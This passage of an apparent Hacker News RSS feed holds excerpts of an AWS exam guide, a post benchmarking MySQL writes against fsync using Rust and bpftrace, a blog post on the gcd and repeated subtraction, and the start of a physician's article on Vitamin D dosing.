<li>Ephemeral storage (legacy) is temporary storage for your EC2 instance. Good for to use as scratch disk, not storing data! Data will be removed after the instance shuts down.</li>
</ul>
<p><strong>Elastic File System (EFS)</strong>
It's a highly durable storage that can be shared with EC2 instance (NFS protocol). A good use case for former stateful applications that need block storage but aren't scalable yet. This provides a good solution to make your application scalable whilst keeping the data intact.</p>
<h4 id="amazon-simple-storage-service-s3">Amazon Simple Storage Service (S3)</h4>
<p>S3 is object storage which is highly durable 99.999999999% with virtually unlimited capacity. It contains different <a target="_blank" href="https://aws.amazon.com/s3/storage-classes/">storage classes:</a></p>
<ul>
<li>S3 standard</li>
<li>S3 Intelligent-Tiering</li>
<li>S3 Standard-Infrequent Access</li>
<li>S3 One Zone-Infrequent Access</li>
<li>S3 Glacier</li>
<li>S3 Glacier Deep Archive</li>
</ul>
<h4 id="design-decoupling-systems-using-aws-services">Design decoupling systems using AWS services</h4>
<p>Decoupling components becomes important when you're architecting in the cloud. Loose coupling isolates the layers and components of your application so that each component interacts asynchronously with the others. This is necessary if you want to enable scalability and want your system to become stateless.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597867420658/5ipcnFqVD.jpeg?auto=format&amp;q=60" alt="Order dispatcher example decoupled system"></p><p>
Example of a decoupled system using SQS + Autoscaling

</p><h4 id="elastic-load-balancer-elb">Elastic Load Balancer (ELB)</h4>
<p>ELB's are a trivial part in high availability and scalability. It comes in 3 flavors:</p>
<ul>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/introduction.html">Classic ELB</a></li>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/introduction.html">Application Load Balancer (ALB)</a></li>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html">Network Load Balancer (NLB)</a></li>
</ul>
<p><strong>Sources</strong>
<a target="_blank" href="https://aws.amazon.com/ebs/faqs/">Amazon EBS FAQs</a>
<a target="_blank" href="https://aws.amazon.com/efs/faq/">EFS FAQs</a>
<a target="_blank" href="https://aws.amazon.com/s3/faqs/">S3 FAQs</a>
<a target="_blank" href="https://d0.awsstatic.com/whitepapers/Storage/AWS%20Storage%20Services%20Whitepaper-v9.pdf">AWS Storage Services whitepaper</a></p>
<h3 id="domain-2-design-high-performing-architectures">Domain 2: Design High-Performing Architectures</h3>
<h4 id="amazon-rds">Amazon RDS</h4>
<p>For relational databases …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dannys.cloud/aws-solutions-architect-associate-exam-guide">https://dannys.cloud/aws-solutions-architect-associate-exam-guide</a></em></p>]]>
            </description>
            <link>https://dannys.cloud/aws-solutions-architect-associate-exam-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262145</guid>
            <pubDate>Mon, 24 Aug 2020 16:20:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is max MySQL transactions per second = max fsyncs per second?]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24262057">thread link</a>) | @Sirupsen
<br/>
August 24, 2020 | https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second/ | <a href="https://web.archive.org/web/*/https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-content">
    

    <p>Napkin friends, from near and far, it’s time for another napkin problem!</p>
<p>Since the beginning of this newsletter I’ve posed problems for you to try to
answer. Then in the next month’s edition, you hear my answer. Talking with a few
of you, it seems many of you read these as posts regardless of their
problem-answer format.</p>
<p>That’s why I’ve decided to experiment with a simpler format: posts where I both
present a problem and solution in one go. This one will be long, since it’ll
include an answer to last month’s.</p>
<p>Hope you enjoy this format! As always, you are encouraged to reach out with
feedback.</p>
<h2 id="problem-10-is-mysqls-maximum-transactions-per-second-equivalent-to-fsyncs-per-second">Problem 10: Is MySQL’s maximum transactions per second equivalent to fsyncs per second?</h2>
<p>How many transactions (‘writes’) per second is MySQL capable of?</p>
<p>A naive model of how a write (a SQL insert/update/delete) to an ACID-compliant
database like MySQL works might be the following (this applies equally to
Postgres, or any other relational/ACID-compliant databases, but we’ll
proceed to work with MySQL as it’s the one I know best):</p>
<ol>
<li>Client sends query to MySQL over an existing connection: <code>INSERT INTO products (name, price) VALUES ('Sneaker', 100)</code></li>
<li>MySQL inserts the new record to the write-ahead-log (WAL) and calls
<code>fsync(2)</code> to tell the operating system to tell the filesystem to tell the
disk to make <em>sure</em> that this data is <em>for sure</em>, pinky-swear committed to
the disk. This step, being the most complex, is depicted below.</li>
<li>MySQL inserts the record into an in-memory page in the backing storage engine
(InnoDB) so the record will be visible to subsequent queries. Why commit to
the storage engine <em>and</em> the WAL? The storage engine is optimized for serving
query results the data, and the WAL for writing it in a safe manner – we
can’t serve a <code>SELECT</code> efficiently from the WAL!</li>
<li>MySQL returns <code>OK</code> to the client.</li>
<li>MySQL eventually calls <code>fsync(2)</code> to ensure InnoDB commits the page to disk.</li>
</ol>
<p><img src="https://user-images.githubusercontent.com/97400/87759326-21adeb00-c7dc-11ea-89c7-559ca11530e8.png" alt="Napkin_10"></p>
<p>In the event of power-loss at any of these points, the behaviour can be defined
without nasty surprises, upholding our dear ACID-compliance.</p>
<p>Splendid! Now that we’ve constructed a naive model of how a relational database
might handle writes safely, we can consider the latency of inserting a new
record into the database. When we consult <a href="https://github.com/sirupsen/napkin-math">the reference napkin numbers</a>, we
see that the <code>fsync(2)</code> in step (2) is by <em>far</em> the slowest operation in the
blocking chain at 1 ms.</p>
<p>For example, the network handling at step (1) takes roughly ~10 μs (TCP Echo
Server is what we can classify as ‘the TCP overhead’). The <code>write(2)</code> itself
prior to the <code>fsync(2)</code> is also negligible at ~10 μs, since this system call
essentially just writes to an in-memory buffer (the ‘page cache’) in the kernel.
This doesn’t guarantee the actual bits are committed on disk, which means an
unexpected loss of power would erase the data, dropping our ACID-compliance on
the floor. Calling <code>fsync(2)</code> guarantees us the bits are persisted on the disk,
which will survive an unexpected system shutdown.  Downside is that it’s 100x
slower.</p>
<p>With that, we should be able to form a simple hypothesis on the maximum
throughput of MySQL:</p>
<blockquote>
<p>The maximum theoretical throughput of MySQL is equivalent to the maximum
number of <code>fsync(2)</code> per second.</p>
</blockquote>
<p>We know that <code>fsync(2)</code> takes 1 ms from earlier, which means we would naively
expect that MySQL would be able to perform in the neighbourhood of: <code>1s / 1ms/fsync = 1000 fsyncs/s = 1000 transactions/s</code> .</p>
<p>Excellent. We followed the first three of the napkin math steps: (1) Model the
system, (2) Identify the relevant latencies, (3) Do the napkin math, (4) Verify
the napkin calculations against reality.</p>
<p>On to (4: Verifying)! We’ll write a simple benchmark in Rust that writes to
MySQL with 16 threads, doing 1,000 insertions each:</p>
<div><pre><code data-lang="rust"><span>for</span><span> </span>i<span> </span><span>in</span><span> </span><span>0</span>..<span>16</span><span> </span>{<span>
</span><span>    </span>handles.push(thread::spawn({<span>
</span><span>        </span><span>let</span><span> </span>pool<span> </span><span>=</span><span> </span>pool.clone();<span>
</span><span>        </span><span>move</span><span> </span><span>||</span><span> </span>{<span>
</span><span>            </span><span>let</span><span> </span><span>mut</span><span> </span>conn<span> </span><span>=</span><span> </span>pool.get_conn().unwrap();<span>
</span><span>            </span><span>// TODO: we should ideally be popping these off a queue in case of a stall
</span><span></span><span>            </span><span>// in a thread, but this is likely good enough.
</span><span></span><span>            </span><span>for</span><span> </span>_<span> </span><span>in</span><span> </span><span>0</span>..<span>1000</span><span> </span>{<span>
</span><span>                </span>conn.exec_drop(<span>
</span><span>                    </span><span>r"INSERT INTO products (shop_id, title) VALUES (:shop_id, :title)"</span>,<span>
</span><span>                    </span>params<span>!</span><span> </span>{<span> </span><span>"shop_id"</span><span> </span><span>=&gt;</span><span> </span><span>123</span>,<span> </span><span>"title"</span><span> </span><span>=&gt;</span><span> </span><span>"aerodynamic chair"</span><span> </span>},<span>
</span><span>                </span>)<span>
</span><span>                </span>.unwrap();<span>
</span><span>            </span>}<span>
</span><span>        </span>}<span>
</span><span>    </span>}));<span>
</span><span>
</span><span>    </span><span>for</span><span> </span>handle<span> </span><span>in</span><span> </span>handles<span> </span>{<span>
</span><span>      </span>handle.join().unwrap();<span>
</span><span>    </span>}<span>
</span><span>    </span><span>// 3 seconds, 16,000 insertions
</span><span></span>}<span>
</span></code></pre></div><p>This takes ~3 seconds to perform 16,000 insertions, or ~5,300 insertions per
second. This is <strong>5x</strong> more than the 1,000 <code>fsync</code> per second our napkin math
told us would be the theoretical maximum transactional throughput!</p>
<p>Typically with napkin math we aim for being within an order of magnitude, which
we are. But, when I do napkin math it usually establishes a lower-bound for the
system, i.e. from first-principles, how fast <em>could</em> this system perform in
ideal circumstances?</p>
<p>Rarely is the system 5x faster than napkin math. When we identify a
significant-ish gap between the real-life performance and the expected
performance, I call it the “first-principle gap.” This is where curiosity sets
in. It typically means there’s (1) an opportunity to improve the system, or (2)
a flaw in our model of the system. In this case, only (2) makes sense, because
the system is faster than we predicted.</p>
<p>What’s wrong with our model of how the system works? Why aren’t fsyncs per
second equal to transactions per second?</p>
<p>First I examined the benchmark… is something wrong? Nope <code>SELECT COUNT(*) FROM products</code> says 16,000. Is the MySQL I’m using configured to not <code>fsync</code> on every
write? Nope, it’s at the <a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_flush_log_at_trx_commit">safe default</a>.</p>
<p>Then I sat down and thought about it. Perhaps MySQL is <em>not</em> doing an <code>fsync</code>
for every <em>single</em> write? If it’s processing 5,300 insertions per second,
perhaps it’s batching multiple writes together as part of writing to the WAL,
step (2) above? Since each transaction is so short, MySQL would benefit from
waiting a few microseconds to see if other transactions want to ride along
before calling the expensive <code>fsync(2)</code>.</p>
<p>We can test this hypothesis by writing a simple <code>bpftrace</code> script to observe the
number of <code>fsync(1)</code> for the ~16,000 insertions:</p>
<div><pre><code data-lang="d"><span>tracepoint:</span>syscalls<span>:</span>sys_enter_fsync<span>,</span>tracepoint<span>:</span>syscalls<span>:</span>sys_enter_fdatasync
<span>/</span>comm <span>==</span> <span>"mysqld"</span><span>/</span>
<span>{</span>
        <span>@fsyncs</span> <span>=</span> count<span>();</span>
<span>}</span>
</code></pre></div><p>Running this during the ~3 seconds it takes to insert the 16,000 records we get
~8,000 <code>fsync</code> calls:</p>
<div><pre><code data-lang="bash">$ sudo bpftrace fsync_count.d
Attaching <span>2</span> probes...
^C

@fsyncs: <span>8037</span>
</code></pre></div><p>This is a peculiar number. If MySQL was batching fsyncs, we’d expect something
far lower. This number means that we’re on average doing ~2,500 <code>fsync</code> per
second, at a latency of ~0.4ms. This is twice as fast as the <code>fsync</code> latency we
expect, the 1ms mentioned earlier. For sanity, I ran the script to benchmark
<code>fsync</code> outside MySQL again, no, <a href="https://github.com/sirupsen/napkin-math/blob/fe780331c6f0c6f225a70c8a37c21e0740f7c73c/src/main.rs#L491">still 1ms</a>. <a href="https://gist.github.com/sirupsen/9fd5fe9466e82df073ed8a13ed1f661f#file-napkin-bash">Looked at the
distribution</a>, and it was consistently ~1ms.</p>
<p>So there’s two things we can draw from this: (1) We’re able to <code>fsync</code> more than
twice as fast as we expect, (2) Our hypothesis was correct that MySQL is more
clever than doing one <code>fsync</code> per transaction, however, since <code>fsync</code> also was
faster than expected, this didn’t explain everything.</p>
<p>If you remember from above, while committing the transaction could theoretically
be a single <code>fsync</code>, other features of MySQL might also call <code>fsync</code>. Perhaps
they’re adding noise?</p>
<p>We need to group <code>fsync</code> by file descriptor to get a better idea of how MySQL
uses <code>fsync</code>. However, the raw file descriptor number doesn’t tell us much. We
can use <code>readlink</code> and the <code>proc</code> file-system to obtain the file name the file
descriptor points to. Let’s write a <a href="https://github.com/iovisor/bpftrace"><code>bpftrace</code> script</a> to see what’s being
<code>fsync</code>'ed:</p>
<div><pre><code data-lang="d"><span>tracepoint:</span>syscalls<span>:</span>sys_enter_fsync<span>,</span>tracepoint<span>:</span>syscalls<span>:</span>sys_enter_fdatasync
<span>/</span>comm <span>==</span> str<span>(</span>$1<span>)/</span>
<span>{</span>
        <span>@fsyncs</span><span>[</span>args<span>-&gt;</span>fd<span>]</span> <span>=</span> count<span>();</span>
        <span>if</span> <span>(</span><span>@fd_to_filename</span><span>[</span>args<span>-&gt;</span>fd<span>])</span> <span>{</span>
        <span>}</span> <span>else</span> <span>{</span>
                <span>@fd_to_filename</span><span>[</span>args<span>-&gt;</span>fd<span>]</span> <span>=</span> <span>1</span><span>;</span>
                system<span>(</span><span>"echo -n 'fd %d -&gt; ' &amp;1&gt;&amp;2 | readlink /proc/%d/fd/%d"</span><span>,</span> args<span>-&gt;</span>fd<span>,</span> pid<span>,</span> args<span>-&gt;</span>fd<span>);</span>
        <span>}</span>
<span>}</span>

END <span>{</span>
        clear<span>(</span><span>@fd_to_filename</span><span>);</span>
<span>}</span>
</code></pre></div><p>Running this while inserting the 16,000 transactions into MySQL gives us:</p>
<div><pre><code data-lang="bash">personal@napkin:~$ sudo bpftrace --unsafe fsync_count_by_fd.d mysqld
Attaching <span>5</span> probes...
fd <span>5</span> -&gt; /var/lib/mysql/ib_logfile0 <span># redo log, or write-ahead-log</span>
fd <span>9</span> -&gt; /var/lib/mysql/ibdata1 <span># shared mysql tablespace</span>
fd <span>11</span> -&gt; /var/lib/mysql/#ib_16384_0.dblwr <span># innodb doublewrite-buffer</span>
fd <span>13</span> -&gt; /var/lib/mysql/undo_001 <span># undo log, to rollback transactions</span>
fd <span>15</span> -&gt; /var/lib/mysql/undo_002 <span># undo log, to rollback transactions</span>
fd <span>27</span> -&gt; /var/lib/mysql/mysql.ibd <span># tablespace</span> 
fd <span>34</span> -&gt; /var/lib/mysql/napkin/products.ibd <span># innodb storage for our products table</span>
fd <span>99</span> -&gt; /var/lib/mysql/binlog.000019 <span># binlog for replication</span>
^C

@fsyncs<span>[</span>9<span>]</span>: <span>2</span>
@fsyncs<span>[</span>12<span>]</span>: <span>2</span>
@fsyncs<span>[</span>27<span>]</span>: <span>12</span>
@fsyncs<span>[</span>34<span>]</span>: <span>47</span>
@fsyncs<span>[</span>13<span>]</span>: <span>86</span>
@fsyncs<span>[</span>15<span>]</span>: <span>93</span>
@fsyncs<span>[</span>11<span>]</span>: <span>103</span>
@fsyncs<span>[</span>99<span>]</span>: <span>2962</span>
@fsyncs<span>[</span>5<span>]</span>: <span>4887</span>
</code></pre></div><p>What we can observe here is that the majority of the writes are to the “redo
log”, what we call the “write-ahead-log” (WAL). There’s a few <code>fsync</code> calls to
commit the InnoDB table-space, not nearly as often, as we can always recover
this from the WAL in case we crash between them. Reads work just fine prior to
the <code>fsync</code>, as the queries can simply be served out of memory from InnoDB.</p>
<p>The only surprising thing here is the substantial volume of writes to the
binlog, which we haven’t mentioned before. You can think of the binlog as the
“replication stream.” It’s a stream of events such as <code>row a changed from x to y</code>, <code>row b was deleted</code>, and <code>table u added column c</code>. The primary replica
streams this to the read-replicas, which use it to update their own data.</p>
<p>When you think about it, the <code>binlog</code> and the WAL need to be kept exactly in
sync. We can’t have something committed on the primary replica, but not
committed to the replicas. If they’re not in sync, this could cause loss of data
due to drift in the read-replicas. The primary could commit a change to the WAL,
lose power, recover, and never write it to the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second/">https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second/</a></em></p>]]>
            </description>
            <link>https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262057</guid>
            <pubDate>Mon, 24 Aug 2020 16:12:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[So you think you know subtraction]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261990">thread link</a>) | @plumsempy
<br/>
August 24, 2020 | https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/ | <a href="https://web.archive.org/web/*/https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-1295">

	

	
			<figure>
				<img width="1229" height="727" src="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=1229" alt="" loading="lazy" srcset="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png 1229w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=150 150w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=300 300w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=768 768w, https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=1024 1024w" sizes="(max-width: 1229px) 100vw, 1229px" data-attachment-id="1315" data-permalink="https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/illustration-4/" data-orig-file="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png" data-orig-size="1229,727" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Illustration – 4" data-image-description="" data-medium-file="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=300" data-large-file="https://plumsempy.files.wordpress.com/2020/08/illustration-4-e1598245496422.png?w=750">			</figure><!-- .post-thumbnail -->

		
	<div>
		
<p>The greatest common divisor is something I learned in school but it was one of those “so what?” subjects. But recently I revisited it and it is very interesting.</p>



<p><strong>Why is gcd cool?</strong></p>



<p>Every number, can be expressed as the product of prime numbers. This product for every number is unique; sort of like saying, every number has a fingerprint. This is called the <a href="https://en.wikipedia.org/wiki/Fundamental_theorem_of_arithmetic">fundamental theorem of arithmetic</a>. 36 is <code>4x9</code>, and 45 is <code>5x9</code>. This means that some numbers will have common parts with each other.</p>



<p>These common parts can divide both numbers, and thus they are common divisors. In the example above, 36 is <code>4x9</code> or <code>2x2x3x3</code>, while 45 is <code>5x3x3</code>; 3 is a common divisor of both, so is <code>3x3</code>, which is 9; but 9 is the greatest divisor of both 36 and 45.</p>



<p>One question I had when I was younger, was why we are talking about the “greatest” and not the smallest common divisor. We could, but soon, this gets boring: there is 1, the smallest common divisor of every number, then there are some common divisors in between 1 and the gcd. But what the gcd does so uniquely, is that it takes two numbers and gives us <em>all</em> the common parts of two numbers. </p>



<figure><img data-attachment-id="1328" data-permalink="https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/illustration-1-3/" data-orig-file="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png" data-orig-size="1150,844" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Illustration – 1" data-image-description="" data-medium-file="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=300" data-large-file="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=750" src="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=1024" alt="" srcset="https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=1024 1024w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=150 150w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=300 300w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png?w=768 768w, https://plumsempy.files.wordpress.com/2020/08/illustration-1-2-e1598337364870.png 1150w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>common and uncommon parts of 36(4×9) and 45(5×9). The gcd of 36 and 45 is 9.</figcaption></figure>



<p>This is cool! The uncommon parts are relatively prime! — meaning, they have nothing in common but the number 1. </p>



<p>So to find the gcd, then, we need to find all the common parts of the two numbers when written in terms of their prime factors. </p>



<p><code>36=3x3x2x2</code> and <code>45=3x3x5</code>, thus the gcd of 36 and 45 is <code>3x3</code>, which is 9. So 36 is 9(4) and 45 is 9(5). It is very interesting to look at numbers as multiples of gcds. Moreover, notice that these multipliers, 4 and 5 in the example above, are relatively prime. </p>



<p><strong>The magic of subtraction</strong></p>



<p>Subtracting two relatively prime numbers, will produce another number that, while not necessarily prime itself, will be relatively prime to both the previous numbers. As an example, <code>13-7=6</code>. 6 is not prime, but it is relatively prime to both 7 and 13. If we subtract 6 from 13 we will get 7 again which is not very interesting. But if we subtract 6 from 7, the smaller one, since 6 and 7 are relatively prime we should get another number that is relatively prime to them both; <code>7-6=1</code>, which is relatively prime to every other number, if keep doing this:</p>


<pre title="">13 -  7 = 6
7  -  6 = 1
6  -  1 = 5
5  -  1 = 4
4  -  1 = 3
3  -  1 = 2
2  -  1 = 1
1  -  1 = 0

(1, 0)
</pre>


<p>The final two numbers are 0 and 1. So whenever we start with two relatively prime numbers and do this on them, it will always end with 0 and 1. This is pretty strange and magical. I am still perplexed by it, but the way I convinced myself, is to think about it bottom up: if we start with the number 1, and try to build our way to any other number by addition, there are finite number of ways. So when we start subtracting, what we are doing is walking that path backwards towards 1. </p>



<figure><img data-attachment-id="1319" data-permalink="https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/illustration-3/" data-orig-file="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png" data-orig-size="1226,634" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Illustration – 3" data-image-description="" data-medium-file="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=300" data-large-file="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=750" src="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=1024" alt="" srcset="https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=1024 1024w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=150 150w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=300 300w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png?w=768 768w, https://plumsempy.files.wordpress.com/2020/08/illustration-3-e1598245714605.png 1226w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>There is a limited set of paths from any two numbers back to 1 by successive subtractions.</figcaption></figure>



<p>Now why do these two numbers need to be relatively prime? because if they are not relatively prime, that means that they have some parts in common, like 36 and 45 above, remember? they are 9(4) and 9(5). If we do the subtracting trick on them:</p>


<pre title="">9(5) - 9(4) = 9(1)
9(4) - 9(1) = 9(3)
9(3) - 9(1) = 9(2)
9(2) - 9(1) = 9(1)
9(1) - 9(1) = 9(0)

(9(1), 0)
</pre>


<p>So you see, the common part survives the subtractions, while the uncommon parts converge to 1. But 9 is <em>all</em> the common parts of 36 and 45, in other words the gcd of 36 and 45! </p>



<p>Can we keep subtracting any two numbers until we reach (X, 0) and then proclaim X is the greatest common divisor? yes, we can, and it is called the <em><a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">Euclidean Algorithm</a></em>.</p>



<p>Here is a silly experiment, what if we subtract the partially common parts? for 36 and 45, what if we wrote them as 3(12) and 3(15)?</p>


<pre title="">3(15) -  3(12) = 3(3)
3(12) -  3(3)  = 3(9)
3(9)  -  3(3)  = 3(6)
3(6)  -  3(3)  = 3(3)
3(3)  -  3(3)  = 3(0)

(3(3), 0)
</pre>


<p>This is really funny. The algorithm basically told us that the gcd of 12 and 15 is 3. Now if we choose to multiply the other 3 that we have factored out before we started our subtraction, it will yield the same result: the gcd of 36 and 45 is 9.</p>



<p><strong>What just happened?</strong></p>



<p>We started by finding the gcd of two numbers, then subtracting the uncommon, relatively prime parts to realize we always reach 1, so if we always subtract any two numbers from each other repeatedly, since the gcd is a common factor of both, it will remain constant until the end, when the uncommon parts have reduced down to 1 and 0; and then what we are left with is the gcd. </p>



<p>Here is a recursive implementation of it in Python:</p>


<pre title="">def gcd(a,b):
    if a == 0: return b
    if b == 0: return a

    return gcd(abs(a-b), min(a,b))
</pre>


<p>If someone has a better explanation of why subtracting relatively prime numbers repeatedly will always result in one, please leave a comment or reach out and help me understand better.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article><!-- #post-${ID} -->

	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://plumsempy.com/2020/08/24/gcd-and-the-magic-of-subtraction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261990</guid>
            <pubDate>Mon, 24 Aug 2020 16:08:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vitamin D, part 2: Shannon's story]]>
            </title>
            <description>
<![CDATA[
Score 408 | Comments 297 (<a href="https://news.ycombinator.com/item?id=24261948">thread link</a>) | @usefulcat
<br/>
August 24, 2020 | https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe | <a href="https://web.archive.org/web/*/https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="7.16.2"><div dir="ltr"><div><div id="viewer-clbfl"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.devaboone.com/post/vitamin-d-part-2-shannon-s-story?postId=5f39453f8d01fe00170023fe" data-pin-media="https://static.wixstatic.com/media/3e0600_cc86ea12bc4248faaa2a0e149d1a9ef4~mv2.jpg/v1/fit/w_900,h_450,al_c,q_80/file.png" src="https://static.wixstatic.com/media/3e0600_cc86ea12bc4248faaa2a0e149d1a9ef4~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></div></div></div></div><h3 id="viewer-7adfi">How much Vitamin D should I take? This is still the looming question, and it’s time to address it. </h3><p id="viewer-9k73p">First, though, imagine that someone in a public forum online asked me, “How much metoprolol (a common blood pressure medication) should I take?” It would be clear that I could not give a real answer. I could give a heavily qualified blanket statement that covered indications and common starting doses, and then recommended speaking with a doctor regarding a personalized dosage. I wouldn’t give a specific dose. But no one would expect me to.  Metoprolol is a medication, and medications are usually prescribed by a physician.</p><p id="viewer-7tpp4">We think of vitamins and supplements differently. A few readers have made comments like this: “I understand that the evidence for Vitamin D in healthy adults doesn’t really show a benefit, but I take Vitamin D because it probably won’t hurt me, and it might help.” This is a common sentiment regarding supplements, but not a statement that most people would make about metoprolol, or any prescribed medication.  Medications are generally understood to be substances taken in response to a specific disease or condition, and we hope that research has shown that they work. Supplements are given a pass; we take them if they might help, even though they may not be needed. </p><p id="viewer-2fbtq"><strong>But Vitamin D should be thought of as a medication</strong>, despite being sold over-the-counter in the supplements aisle. </p><p id="viewer-5549c">To illustrate this, let me introduce Shannon. </p><p id="viewer-518ch">In the fall of 2018, Shannon R. was the special education director for a large Arizona school district. Normally energetic and expressive, the otherwise healthy 38-year-old began having an odd and disturbing symptom: difficulty speaking. Her husband and two boys would ask her questions, and though understanding the question, she was unable to formulate the words to respond. </p><p id="viewer-e7f4v">Milder problems had started over the summer, when she felt more tired than usual. As the months passed, new symptoms appeared: palpitations, insomnia, anxiety, along with cognitive deficits – “like my brain wouldn’t function,” she recalled. Her heart rate, normally in the 60s, now often stayed in the 90s, even while in bed. She barely slept at night and lost nearly 50 pounds. By mid-semester, she was often unable to work. At around 1 AM one October morning, she was taken to the emergency room for a racing heart. When there, she had difficulty responding to the doctors’ and nurses’ questions. After a full workup, the doctors had no explanation, so they 